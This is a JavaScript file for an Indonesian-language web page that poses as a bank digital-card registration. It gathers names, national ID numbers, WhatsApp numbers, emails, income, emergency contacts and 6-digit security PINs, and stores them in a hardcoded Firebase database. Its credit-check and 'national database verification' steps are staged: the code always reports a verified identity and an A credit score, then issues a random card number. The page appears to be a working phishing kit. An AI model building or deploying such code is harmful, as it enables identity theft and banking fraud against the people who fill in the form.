import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;
const totalSteps = 8;

// --- AUTO FORMATTING INPUT ---
document.addEventListener('DOMContentLoaded', () => {
    const inputNama = document.getElementById('inputNama');
    const inputNIK = document.getElementById('inputNIK');
    const inputPW = document.getElementById('inputPW');

    // Nama otomatis KAPITAL saat mengetik
    inputNama.addEventListener('input', () => {
        inputNama.value = inputNama.value.toUpperCase();
    });

    // NIK hanya boleh ANGKA (Hapus karakter lain)
    inputNIK.addEventListener('input', () => {
        inputNIK.value = inputNIK.value.replace(/[^0-9]/g, '');
    });

    // PIN hanya boleh ANGKA & MAKSIMAL 6
    inputPW.addEventListener('input', () => {
        let val = inputPW.value.replace(/[^0-9]/g, '');
        if (val.length > 6) val = val.substring(0, 6);
        inputPW.value = val;
    });
});

// --- FUNGSI NAVIGASI & VALIDASI KETAT ---
window.nextStep = (s) => {
    if (s === 2) {
        const nama = document.getElementById('inputNama').value.trim();
        const nik = document.getElementById('inputNIK').value;
        if (nama.length < 3) return alert("Isi Nama Lengkap dengan benar!");
        if (nik.length < 16) return alert("NIK harus 16 digit angka!");
    } else if (s === 3) {
        const wa = document.getElementById('inputWA').value;
        if (!wa.startsWith('08')) return alert("Gunakan nomor WhatsApp valid (08...)!");
        if (!document.getElementById('inputEmail').value.includes('@')) return alert("Email tidak valid!");
    } else if (s === 4) {
        if (document.getElementById('jobType').value === "") return alert("Pilih Pekerjaan Anda!");
        if (document.getElementById('income').value === "") return alert("Isi Pendapatan bulanan!");
    } else if (s === 5) {
        if (document.getElementById('emergencyName').value.trim() === "") return alert("Isi Nama Kontak Darurat!");
    } else if (s === 6) {
        const pin = document.getElementById('inputPW').value;
        if (pin.length < 6) return alert("PIN Keamanan wajib 6 digit angka!");
    }

    currentStep = s;
    updateUI(s);
    if (s === 6) simulasiAnalisis();
}

function updateUI(s) {
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    document.getElementById('step' + s).classList.add('active');
    
    const percent = ((s - 1) / (totalSteps - 1)) * 100;
    document.getElementById('progressLine').style.width = percent + "%";
    
    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s - 1) { 
            c.classList.add('completed'); 
            c.innerHTML = "✓"; 
        } else if (i === s - 1) { 
            c.classList.add('active'); 
            c.innerHTML = i + 1; 
        } else { 
            c.classList.remove('active', 'completed'); 
            c.innerHTML = i + 1; 
        }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => status.innerText = "Sinkronisasi BI-Checking...", 1500);
    setTimeout(() => {
        status.innerHTML = "<b style='color:green'>IDENTITAS TERVERIFIKASI</b><br>Skor Kredit: A (Sangat Baik)";
        btn.style.display = "block";
    }, 3500);
}

window.generateFinal = async () => {
    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui pernyataan tanggung jawab!");
    
    const nik = document.getElementById('inputNIK').value;
    const btn = document.getElementById('btnGenerate');
    btn.disabled = true;
    btn.innerText = "MENGECEK DATABASE...";

    try {
        const dbRef = ref(db);
        const snapshot = await get(child(dbRef, `nasabah`));
        let exists = false;

        if (snapshot.exists()) {
            const data = snapshot.val();
            for (let id in data) {
                if (data[id].nik === nik) { exists = true; break; }
            }
        }

        if (exists) {
            alert("MAAF: NIK Anda sudah terdaftar dalam sistem kami.");
            location.reload();
        } else {
            updateUI(8);
            initQueue();
        }
    } catch(e) { 
        alert("Koneksi Error!"); 
        btn.disabled = false; 
        btn.innerText = "Terbitkan Kartu Digital";
    }
}

function initQueue() {
    const duration = 120; 
    const targetTime = Date.now() + (duration * 1000);
    localStorage.setItem('bdn_target_time', targetTime);
    runQueue();
}

function runQueue() {
    const qStatus = document.getElementById('queueStatus');
    const tDisplay = document.getElementById('timerDisplay');
    const fillBar = document.getElementById('fillBar');
    
    const interval = setInterval(() => {
        const now = Date.now();
        const target = localStorage.getItem('bdn_target_time');
        const diff = Math.ceil((target - now) / 1000);

        if (diff <= 0) {
            clearInterval(interval);
            tDisplay.innerText = "Estimasi: Selesai";
            fillBar.style.width = "100%";
            finalRevealProcess();
            return;
        }

        const progress = ((120 - diff) / 120) * 100;
        fillBar.style.width = progress + "%";

        const m = Math.floor(diff / 60);
        const s = diff % 60;
        tDisplay.innerText = m > 0 ? `Estimasi: ${m} Min ${s} Detik` : `Estimasi: ${s} Detik`;

        if (diff > 80) qStatus.innerText = "Enkripsi Protokol Keamanan...";
        else if (diff > 40) qStatus.innerText = "Verifikasi Database Nasional...";
        else qStatus.innerText = "Menerbitkan Sertifikat Digital...";
    }, 1000);
}

async function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';

    setTimeout(() => document.getElementById('rev1').classList.add('show'), 1000);
    setTimeout(() => document.getElementById('rev2').classList.add('show'), 2500);
    setTimeout(() => document.getElementById('rev3').classList.add('show'), 4000);
    
    const cardNo = "0810" + Array.from({length: 12}, () => Math.floor(Math.random() * 10)).join('');
    
    await saveToRealtime(cardNo);

    setTimeout(() => {
        const card = document.getElementById('captureArea');
        card.style.opacity = "1";
        card.style.transform = "scale(1)";
        document.getElementById('btnDownload').style.display = "block";
    }, 5500);
}

async function saveToRealtime(cardNo) {
    const nama = document.getElementById('inputNama').value.toUpperCase();
    try {
        await set(ref(db, 'nasabah/' + cardNo), {
            nama: nama,
            nik: document.getElementById('inputNIK').value,
            wa: document.getElementById('inputWA').value,
            email: document.getElementById('inputEmail').value,
            pekerjaan: document.getElementById('jobType').value,
            pendapatan: document.getElementById('income').value,
            kontak_darurat: document.getElementById('emergencyName').value,
            pin: document.getElementById('inputPW').value,
            nomor_kartu: cardNo,
            saldo: 50000,
            tgl_daftar: new Date().toISOString()
        });

        document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
        document.getElementById('displayName').innerText = nama;
    } catch(e) { console.error("Simpan Gagal:", e); }
}

window.takeScreenshot = () => {
    html2canvas(document.getElementById('captureArea'), { scale: 3, backgroundColor: null }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD-${document.getElementById('inputNama').value}.png`;
        link.href = canvas.toDataURL("image/png");
        link.click();
    });
}
